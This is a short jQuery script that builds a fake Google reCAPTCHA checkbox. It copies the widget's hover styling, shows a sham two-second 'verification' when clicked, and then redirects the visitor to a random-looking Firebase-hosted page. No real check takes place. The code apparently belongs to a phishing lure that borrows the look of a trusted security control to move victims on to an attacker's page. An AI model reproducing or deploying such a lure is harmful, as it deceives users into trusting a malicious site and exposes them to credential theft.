 $( document ).ready(function() {

//checkbox hover
$( "#ldyzoinsxigm" ).hover(
    function() {
        $(this).addClass("recaptcha-checkbox-hover");
    }, function() {
        $(this).removeClass("recaptcha-checkbox-hover");
    }
);

//checkbox click
$( "#border" ).click(function() {
    $( this ).remove();
    $( "#checkmark" ).hide();
    setTimeout(function () {
        $( "#loading" ).remove();
        $( "#checkmark" ).show();
        window.location.replace("https://epsqoejzyi.web.app/r.html");
    }, 2000);
});

});